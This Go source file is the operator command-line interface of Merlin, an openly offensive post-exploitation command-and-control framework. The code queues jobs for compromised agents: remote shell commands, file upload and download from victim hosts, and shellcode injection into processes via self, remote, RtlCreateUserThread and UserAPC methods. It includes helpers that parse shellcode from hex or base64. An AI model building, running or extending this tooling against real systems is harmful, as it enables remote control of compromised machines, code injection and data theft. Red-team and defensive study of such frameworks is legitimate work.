// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package cli

import (
	// Standard
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path"
	"strings"
	"time"

	// 3rd Party
	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
	"github.com/satori/go.uuid"
	"github.com/mattn/go-shellwords"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/agents"
	"github.com/Ne0nd0g/merlin/pkg/banner"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/modules"
)

// Global Variables
var serverLog *os.File
var shellModule modules.Module
var shellAgent uuid.UUID
var prompt *readline.Instance
var shellCompleter *readline.PrefixCompleter
var shellMenuContext = "main"

// Shell is the exported function to start the command line interface
func Shell() {

	shellCompleter = getCompleter("main")

	p, err := readline.NewEx(&readline.Config{
		Prompt:              "\033[31mMerlin»\033[0m ",
		HistoryFile:         "/tmp/readline.tmp",
		AutoComplete:        shellCompleter,
		InterruptPrompt:     "^C",
		EOFPrompt:           "exit",
		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})

	if err != nil {
		color.Red("[!]There was an error with the provided input")
		color.Red(err.Error())
	}
	prompt = p
	defer prompt.Close()

	log.SetOutput(prompt.Stderr())

	for {
		line, err := prompt.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		cmd := strings.Fields(line)

		if len(cmd) > 0 {
			switch shellMenuContext {
			case "main":
				switch cmd[0] {
				case "agent":
					if len(cmd) > 1 {
						menuAgent(cmd[1:])
					}
				case "banner":
					color.Blue(banner.Banner1)
					color.Blue("\t\t   Version: %s", merlin.Version)
				case "help":
					menuHelpMain()
				case "?":
					menuHelpMain()
				case "exit":
					exit()
				case "interact":
					if len(cmd) > 1 {
						i := []string{"interact"}
						i = append(i, cmd[1])
						menuAgent(i)
					}
				case "quit":
					exit()
				case "remove":
					if len(cmd) > 1 {
						i := []string{"remove"}
						i = append(i, cmd[1])
						menuAgent(i)
					}
				case "sessions":
					menuAgent([]string{"list"})
				case "use":
					menuUse(cmd[1:])
				case "version":
					color.Blue(fmt.Sprintf("Merlin version: %s", merlin.Version))
				case "":
				default:
					message("info", "Executing system command...")
					if len(cmd) > 1 {
						executeCommand(cmd[0], cmd[1:])
					} else {
						var x []string
						executeCommand(cmd[0], x)
					}
				}
			case "module":
				switch cmd[0] {
				case "show":
					if len(cmd) > 1 {
						switch cmd[1] {
						case "info":
							shellModule.ShowInfo()
						case "options":
							shellModule.ShowOptions()
						}
					}
				case "info":
					shellModule.ShowInfo()
				case "set":
					if len(cmd) > 2 {
						if cmd[1] == "agent" {
							s, err := shellModule.SetAgent(cmd[2])
							if err != nil {
								message("warn", err.Error())
							} else {
								message("success", s)
							}
						} else {
							s, err := shellModule.SetOption(cmd[1], cmd[2])
							if err != nil {
								message("warn", err.Error())
							} else {
								message("success", s)
							}
						}
					}
				case "reload":
					menuSetModule(strings.TrimSuffix(strings.Join(shellModule.Path, "/"), ".json"))
				case "run":
					r, err := shellModule.Run()
					if err != nil {
						message("warn", err.Error())
					} else {
						m, err := agents.AddJob(shellModule.Agent, "cmd", r)
						if err != nil {
							message("warn", err.Error())
						} else {
							message("note", fmt.Sprintf("Created job %s for agent %s", m, shellModule.Agent))
						}
					}
				case "back":
					menuSetMain()
				case "main":
					menuSetMain()
				case "exit":
					exit()
				case "quit":
					exit()
				case "help":
					menuHelpModule()
				case "?":
					menuHelpModule()
				default:
					message("info", "Executing system command...")
					if len(cmd) > 1 {
						executeCommand(cmd[0], cmd[1:])
					} else {
						var x []string
						executeCommand(cmd[0], x)
					}
				}
			case "agent":
				switch cmd[0] {
				case "back":
					menuSetMain()
				case "cmd":
					if len(cmd) > 1 {
						m, err := agents.AddJob(shellAgent, "cmd", cmd[1:])
						if err != nil {
							message("warn", err.Error())
						} else {
							message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
						}
					}
				case "download":
					if len(cmd) >= 2 {
						arg := strings.Join(cmd[1:]," ")
						argS, errS := shellwords.Parse(arg)
						if errS != nil {
							message("warn",fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", line, errS.Error()))
							break
						}
						if len(argS) >= 1 {
							m, err := agents.AddJob(shellAgent, "download", argS[0:1])
							if err != nil {
								message("warn", err.Error())
								break
							} else {
								message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
							}
						}
					} else {
						message("warn", "Invalid command")
						message("info", "download <remote_file_path>")
					}
				case "execute-shellcode":
					if len(cmd) > 2 {
						var b64 string
						i := 0 // position for the file path or inline bytes
						switch strings.ToLower(cmd[1]) {
						case "self":
							i = 2
						case "remote":
							if len(cmd) > 3 {
								i = 3
							} else {
								message("warn", "Not enough arguments. Try using the help command")
								break
							}
						case "rtlcreateuserthread":
							if len(cmd) > 3 {
								i = 3
							} else {
								message("warn", "Not enough arguments. Try using the help command")
								break
							}
						case "userapc":
							if len(cmd) > 3 {
								i = 3
							} else {
								message("warn", "Not enough arguments. Try using the help command")
								break
							}
						default:
							message("warn", "Not enough arguments. Try using the help command")
							break
						}

						if i > 0 {
							f, errF := os.Stat(cmd[i])
							if errF != nil {
								if core.Verbose {
									message("info", "Valid file not provided as argument, parsing bytes")
									if core.Debug {
										message("debug", fmt.Sprintf("%s", errF.Error()))
									}
								}

								if core.Verbose {
									message("info", "Parsing input into hex")
								}

								h, errH := parseHex(cmd[i:])
								if errH != nil {
									message("warn", errH.Error())
									break
								} else {
									b64 = base64.StdEncoding.EncodeToString(h)
								}
							} else {
								if f.IsDir() {
									message("warn", "A directory was provided instead of a file")
									break
								} else {
									if core.Verbose {
										message("info", "File passed as parameter")
									}
									b, errB := parseShellcodeFile(cmd[i])
									if errB != nil {
										message("warn", "There was an error parsing the shellcode file")
										message("warn", errB.Error())
										break
									}
									b64 = base64.StdEncoding.EncodeToString(b)
								}
							}
						} else {
							message("warn", "Not enough arguments. Try using the help command")
							break
						}

						switch strings.ToLower(cmd[1]) {
						case "self":
							m, err := agents.AddJob(shellAgent, "shellcode", []string{"self", b64})
							if err != nil {
								message("warn", err.Error())
								break
							} else {
								message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
							}
						case "remote":
							m, err := agents.AddJob(shellAgent, "shellcode", []string{"remote", cmd[2], b64})
							if err != nil {
								message("warn", err.Error())
								break
							} else {
								message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
							}
						case "rtlcreateuserthread":
							m, err := agents.AddJob(shellAgent, "shellcode", []string{"rtlcreateuserthread", cmd[2], b64})
							if err != nil {
								message("warn", err.Error())
								break
							} else {
								message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
							}
						case "userapc":
							m, err := agents.AddJob(shellAgent, "shellcode", []string{"userapc", cmd[2], b64})
							if err != nil {
								message("warn", err.Error())
								break
							} else {
								message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
							}
						default:
							message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", cmd[1]))
						}
					}
				case "exit":
					exit()
				case "help":
					menuHelpAgent()
				case "?":
					menuHelpAgent()
				case "info":
					agents.ShowInfo(shellAgent)
				case "kill":
					if len(cmd) > 0 {
						m, err := agents.AddJob(shellAgent, "kill", cmd[0:])
						menuSetMain()
						if err != nil {
							message("warn", err.Error())
						} else {
							message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
						}
					}
				case "main":
					menuSetMain()
				case "quit":
					exit()
				case "set":
					if len(cmd) > 1 {
						switch cmd[1] {
						case "maxretry":
							if len(cmd) > 2 {
								m, err := agents.AddJob(shellAgent, "maxretry", cmd[1:])
								if err != nil {
									message("warn", err.Error())
								} else {
									message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
								}
							}
						case "padding":
							if len(cmd) > 2 {
								m, err := agents.AddJob(shellAgent, "padding", cmd[1:])
								if err != nil {
									message("warn", err.Error())
								} else {
									message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
								}
							}
						case "sleep":
							if len(cmd) > 2 {
								m, err := agents.AddJob(shellAgent, "sleep", cmd[1:])
								if err != nil {
									message("warn", err.Error())
								} else {
									message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
								}
							}
						case "skew":
							if len(cmd) > 2 {
								m, err := agents.AddJob(shellAgent, "skew", cmd[1:])
								if err != nil {
									message("warn", err.Error())
								} else {
									message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
								}
							}
						}
					}
				case "shell":
					if len(cmd) > 1 {
						m, err := agents.AddJob(shellAgent, "cmd", cmd[1:])
						if err != nil {
							message("warn", err.Error())
						} else {
							message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
						}
					}
				case "upload":
					if len(cmd) >= 3 {
						arg := strings.Join(cmd[1:]," ")
						argS, errS := shellwords.Parse(arg)
						if errS != nil {
							message("warn",fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", line, errS.Error()))
							break
						}
						if len(argS) >= 2 {
							_, errF := os.Stat(argS[0])
							if errF != nil{
								message("warn", fmt.Sprintf("There was an error accessing the source upload file:\r\n%s", errF.Error()))
								break
							}
							m, err := agents.AddJob(shellAgent, "upload", argS[0:2])
							if err != nil {
								message("warn", err.Error())
								break
							} else {
								message("note", fmt.Sprintf("Created job %s for agent %s", m, shellAgent))
							}
						}
					} else {
						message("warn", "Invalid command")
						message("info", "upload local_file_path remote_file_path")
					}
				default:
					message("info", "Executing system command...")
					if len(cmd) > 1 {
						executeCommand(cmd[0], cmd[1:])
					} else {
						var x []string
						executeCommand(cmd[0], x)
					}
				}
			}
		}

	}
}

func menuUse(cmd []string) {
	if len(cmd) > 0 {
		switch cmd[0] {
		case "module":
			if len(cmd) > 1 {
				menuSetModule(cmd[1])
			} else {
				message("warn", "Invalid module")
			}
		case "":
		default:
			color.Yellow("[-]Invalid 'use' command")
		}
	} else {
		color.Yellow("[-]Invalid 'use' command")
	}
}

func menuAgent(cmd []string) {
	switch cmd[0] {
	case "list":
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Agent GUID", "Platform", "User", "Host", "Transport", "Status"})
		table.SetAlignment(tablewriter.ALIGN_CENTER)
		for k, v := range agents.Agents {
			// Convert proto (i.e. h2 or hq) to user friendly string
			var proto string
			if v.Proto == "h2" {
				proto = "HTTP/2 (h2)"
			}
			if v.Proto == "hq" {
				proto = "QUIC (hq)"
			}

			table.Append([]string{k.String(), v.Platform + "/" + v.Architecture, v.UserName,
				v.HostName, proto, agents.GetAgentStatus(k)})
		}
		fmt.Println()
		table.Render()
		fmt.Println()
	case "interact":
		if len(cmd) > 1 {
			i, errUUID := uuid.FromString(cmd[1])
			if errUUID != nil {
				message("warn", fmt.Sprintf("There was an error interacting with agent %s", cmd[1]))
			} else {
				menuSetAgent(i)
			}
		}
	case "remove":
		if len(cmd) > 1 {
			i, errUUID := uuid.FromString(cmd[1])
			if errUUID != nil {
				message("warn", fmt.Sprintf("There was an error interacting with agent %s", cmd[1]))
			} else {
				errRemove := agents.RemoveAgent(i)
				if errRemove != nil {
					message("warn", fmt.Sprintf("%s", errRemove.Error()))
				} else {
					message("info", fmt.Sprintf("Agent %s was removed from the server", cmd[1]))
				}
			}
		}
	}
}

func menuSetAgent(agentID uuid.UUID) {
	for k := range agents.Agents {
		if agentID == agents.Agents[k].ID {
			shellAgent = agentID
			prompt.Config.AutoComplete = getCompleter("agent")
			prompt.SetPrompt("\033[31mMerlin[\033[32magent\033[31m][\033[33m" + shellAgent.String() + "\033[31m]»\033[0m ")
			shellMenuContext = "agent"
		}
	}
}

func menuSetModule(cmd string) {
	if len(cmd) > 0 {
		var mPath = path.Join(core.CurrentDir, "data", "modules", cmd+".json")
		s, errModule := modules.Create(mPath)
		if errModule != nil {
			message("warn", errModule.Error())
		} else {
			shellModule = s
			prompt.Config.AutoComplete = getCompleter("module")
			prompt.SetPrompt("\033[31mMerlin[\033[32mmodule\033[31m][\033[33m" + shellModule.Name + "\033[31m]»\033[0m ")
			shellMenuContext = "module"
		}
	}
}

func menuSetMain() {
	prompt.Config.AutoComplete = getCompleter("main")
	prompt.SetPrompt("\033[31mMerlin»\033[0m ")
	shellMenuContext = "main"
}

func getCompleter(completer string) *readline.PrefixCompleter {

	// Main Menu Completer
	var main = readline.NewPrefixCompleter(
		readline.PcItem("agent",
			readline.PcItem("list"),
			readline.PcItem("interact",
				readline.PcItemDynamic(agents.GetAgentList()),
			),
		),
		readline.PcItem("banner"),
		readline.PcItem("help"),
		readline.PcItem("interact",
			readline.PcItemDynamic(agents.GetAgentList()),
		),
		readline.PcItem("remove",
			readline.PcItemDynamic(agents.GetAgentList()),
		),
		readline.PcItem("sessions"),
		readline.PcItem("use",
			readline.PcItem("module",
				readline.PcItemDynamic(modules.GetModuleList()),
			),
		),
		readline.PcItem("version"),
	)

	// Module Menu
	var module = readline.NewPrefixCompleter(
		readline.PcItem("back"),
		readline.PcItem("help"),
		readline.PcItem("info"),
		readline.PcItem("main"),
		readline.PcItem("reload"),
		readline.PcItem("run"),
		readline.PcItem("show",
			readline.PcItem("options"),
			readline.PcItem("info"),
		),
		readline.PcItem("set",
			readline.PcItem("agent",
				readline.PcItem("all"),
				readline.PcItemDynamic(agents.GetAgentList()),
			),
			readline.PcItemDynamic(shellModule.GetOptionsList()),
		),
	)

	// Agent Menu
	var agent = readline.NewPrefixCompleter(
		readline.PcItem("cmd"),
		readline.PcItem("back"),
		readline.PcItem("download"),
		readline.PcItem("execute-shellcode",
			readline.PcItem("self"),
			readline.PcItem("remote"),
			readline.PcItem("RtlCreateUserThread"),
		),
		readline.PcItem("help"),
		readline.PcItem("info"),
		readline.PcItem("kill"),
		readline.PcItem("main"),
		readline.PcItem("shell"),
		readline.PcItem("set",
			readline.PcItem("maxretry"),
			readline.PcItem("padding"),
			readline.PcItem("skew"),
			readline.PcItem("sleep"),
		),
		readline.PcItem("upload"),
	)

	switch completer {
	case "main":
		return main
	case "module":
		return module
	case "agent":
		return agent
	default:
		return main
	}
	return main
}

func menuHelpMain() {
	color.Yellow("Merlin C2 Server (version %s)", merlin.Version)
	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)
	table.SetBorder(false)
	table.SetCaption(true, "Main Menu Help")
	table.SetHeader([]string{"Command", "Description", "Options"})

	data := [][]string{
		{"agent", "Interact with agents or list agents", "interact, list"},
		{"banner", "Print the Merlin banner", ""},
		{"exit", "Exit and close the Merlin server", ""},
		{"interact", "Interact with an agent. Alias for Empire users", ""},
		{"quit", "Exit and close the Merlin server", ""},
		{"remove", "Remove or delete a DEAD agent from the server"},
		{"sessions", "List all agents session information. Alias for MSF users", ""},
		{"use", "Use a function of Merlin", "module"},
		{"version", "Print the Merlin server version", ""},
		{"*", "Anything else will be execute on the host operating system", ""},
	}

	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
	message("info", "Visit the wiki for additional information https://github.com/Ne0nd0g/merlin/wiki/Merlin-Server-Main-Menu")
}

// The help menu while in the modules menu
func menuHelpModule() {
	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)
	table.SetBorder(false)
	table.SetCaption(true, "Module Menu Help")
	table.SetHeader([]string{"Command", "Description", "Options"})

	data := [][]string{
		{"back", "Return to the main menu", ""},
		{"info", "Show information about a module"},
		{"main", "Return to the main menu", ""},
		{"reload", "Reloads the module to a fresh clean state"},
		{"run", "Run or execute the module", ""},
		{"set", "Set the value for one of the module's options", "<option name> <option value>"},
		{"show", "Show information about a module or its options", "info, options"},
	}

	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
	message("info", "Visit the wiki for additional information https://github.com/Ne0nd0g/merlin/wiki/Merlin-Server-Module-Menu")
}

// The help menu while in the agent menu
func menuHelpAgent() {
	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)
	table.SetBorder(false)
	table.SetCaption(true, "Agent Help Menu")
	table.SetHeader([]string{"Command", "Description", "Options"})

	data := [][]string{
		{"cmd", "Execute a command on the agent (DEPRECIATED)", "cmd ping -c 3 8.8.8.8"},
		{"back", "Return to the main menu", ""},
		{"download", "Download a file from the agent", "download <remote_file>"},
		{"execute-shellcode", "Execute shellcode", "self, remote"},
		{"info", "Display all information about the agent", ""},
		{"kill", "Instruct the agent to die or quit", ""},
		{"main", "Return to the main menu", ""},
		{"set", "Set the value for one of the agent's options", "maxretry, padding, skew, sleep"},
		{"shell", "Execute a command on the agent", "shell ping -c 3 8.8.8.8"},
		{"upload", "Upload a file to the agent", "upload <local_file> <remote_file>"},
	}

	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
	message("info", "Visit the wiki for additional information https://github.com/Ne0nd0g/merlin/wiki/Merlin-Server-Agent-Menu")
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

// Message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

func exit() {
	color.Red("[!]Quitting")
	serverLog.WriteString(fmt.Sprintf("[%s]Shutting down Merlin Server due to user input", time.Now()))
	os.Exit(0)
}

func executeCommand(name string, arg []string) {
	var cmd *exec.Cmd

	cmd = exec.Command(name, arg...)

	out, err := cmd.CombinedOutput()

	if err != nil {
		message("warn", err.Error())
	} else {
		message("success", fmt.Sprintf("%s", out))
	}
}

// parseHex evaluates a string array to determine its format and returns a byte array of the hex
func parseHex(str []string) ([]byte, error) {

	if core.Debug {
		message("debug", "Entering into cli.parseHex function")
	}

	hexString := strings.Join(str, "")

	if core.Debug {
		message("debug", "Parsing: ")
		message("debug", fmt.Sprintf("%s", hexString))
	}

	data, err := base64.StdEncoding.DecodeString(hexString)
	if err != nil {
		if core.Verbose {
			message("info", "Passed in string was not Base64 encoded")
		}
		if core.Debug {
			message("debug", fmt.Sprintf("%s", err.Error()))
		}
	} else {
		if core.Verbose {
			message("info", "Passed in string is Base64 encoded")
		}
		s := string(data)
		hexString = s
	}

	// see if string is prefixed with 0x
	if hexString[0:2] == "0x" {
		if core.Verbose {
			message("info", "Passed in string contains 0x; removing")
		}
		hexString = strings.Replace(hexString, "0x", "", -1)
		if strings.Contains(hexString, ",") {
			if core.Verbose {
				message("info", "Passed in string is comma separated; removing")
			}
			hexString = strings.Replace(hexString, ",", "", -1)
		}
		if strings.Contains(hexString, " ") {
			if core.Verbose {
				message("info", "Passed in string contains spaces; removing")
			}
			hexString = strings.Replace(hexString, " ", "", -1)
		}
	}

	// see if string is prefixed with \x
	if hexString[0:2] == "\\x" {
		if core.Verbose {
			message("info", "Passed in string contains \\x; removing")
		}
		hexString = strings.Replace(hexString, "\\x", "", -1)
		if strings.Contains(hexString, ",") {
			if core.Verbose {
				message("info", "Passed in string is comma separated; removing")
			}
			hexString = strings.Replace(hexString, ",", "", -1)
		}
		if strings.Contains(hexString, " ") {
			if core.Verbose {
				message("info", "Passed in string contains spaces; removing")
			}
			hexString = strings.Replace(hexString, " ", "", -1)
		}
	}

	if core.Debug {
		message("debug", fmt.Sprintf("About to convert to byte array: \r\n%s", hexString))
	}

	h, errH := hex.DecodeString(hexString)

	if core.Debug {
		message("debug", "Leaving cli.parseHex function")
	}

	return h, errH

}

// parseShellcodeFile parses a path, evaluates the file's contents, and returns a byte array of shellcode
func parseShellcodeFile(filePath string) ([]byte, error) {

	if core.Debug {
		message("debug", "Entering into cli.parseShellcodeFile function")
	}

	b, errB := ioutil.ReadFile(filePath)
	if errB != nil {
		if core.Debug {
			message("debug", "Leaving cli.parseShellcodeFile function")
		}
		return nil, errB
	}

	h, errH := parseHex([]string{string(b)})
	if errH != nil {
		if core.Verbose {
			message("info", "Error parsing shellcode file for Base64, \\x90\\x00, 0x90,0x00, or 9000 formats; skipping")
			message("info", errH.Error())
		}
	} else {
		if core.Debug {
			message("debug", "Leaving cli.parseShellcodeFile function")
		}
		return h, nil
	}

	if core.Debug {
		message("debug", "Leaving cli.parseShellcodeFile function")
	}

	return b, nil

}

// TODO add command "agents" to list all connected agents
// TODO add command "info" for agent and module menu in addition to "show info"
// TODO create a function to display an agent's status; Green = active, Yellow = missed checkin, Red = missed max retry
